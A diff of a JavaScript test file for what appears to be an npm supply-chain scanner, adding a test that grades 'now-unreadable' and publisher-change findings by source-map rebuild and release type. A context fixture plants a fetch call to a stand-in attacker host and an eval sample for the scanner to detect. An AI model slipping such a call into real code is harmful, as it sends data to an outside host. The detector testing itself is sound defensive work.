@@ -192,6 +192,26 @@ test('whether each new dependency is the caller\'s own is asked four at a time, 
   assert.equal(asked.filter(url => url.startsWith('https://api.npmjs.org/downloads/range/') && /s\d+(?:%2F|\/)p$/iu.test(url)).length, 100, 'a hundred told, as before')
 })
 
+test('a file become unreadable calls for less where its source map was rebuilt with it, or in a major release, as a publisher changed does', () => {
+  const side = (at, files, manifest = {}) => ({ kind: 'sourcemap', npm: { name: 'built', version: at, manifest },
+    json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
+  const short = 'a\n'.repeat(10)
+  const long = name => `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}.map\n`
+  const found = (base, other) => Object.fromEntries(npmCompareFindings(base, other, { added: [], changed: [] })
+    .filter(({ id }) => id === 'now-unreadable' || id === 'publisher').map(({ id, ...finding }) => [id, finding]))
+  const edited = found(side('1.0.0', { 'a.js': short, 'a.js.map': '{}' }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': '{}' }))
+  assert.equal(edited['now-unreadable'].severity, 'critical', 'its map as it was')
+  const rebuilt = found(side('1.0.0', { 'a.js': short, 'a.js.map': '{}' }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': '{"version":3}' }))
+  assert.equal(rebuilt['now-unreadable'].severity, 'high')
+  assert.deepEqual(rebuilt['now-unreadable'].files.map(row => row.rebuilt), [true])
+  const mixed = found(side('1.0.0', { 'a.js': short, 'a.js.map': '{}', 'b.js': short }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': '{"version":3}', 'b.js': long('b.js') }))
+  assert.equal(mixed['now-unreadable'].severity, 'critical', 'one file of them unexplained')
+  const major = found(side('1.4.1', { 'a.js': short }, { publisher: 'known', knownAccounts: ['known'] }), side('2.0.0', { 'a.js': long('a.js') }, { publisher: 'new' }))
+  assert.deepEqual([major['now-unreadable'].severity, major['now-unreadable'].major, major.publisher.severity, major.publisher.major], ['high', true, 'high', true])
+  assert.equal(found(side('0.1.5', { 'a.js': short }), side('0.2.0', { 'a.js': long('a.js') }))['now-unreadable'].severity, 'high', '0.x: its minor is its major')
+  assert.equal(found(side('1.4.1', { 'a.js': short }), side('1.5.0', { 'a.js': long('a.js') }))['now-unreadable'].severity, 'critical', 'a minor release')
+})
+
 test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
   const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
   const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
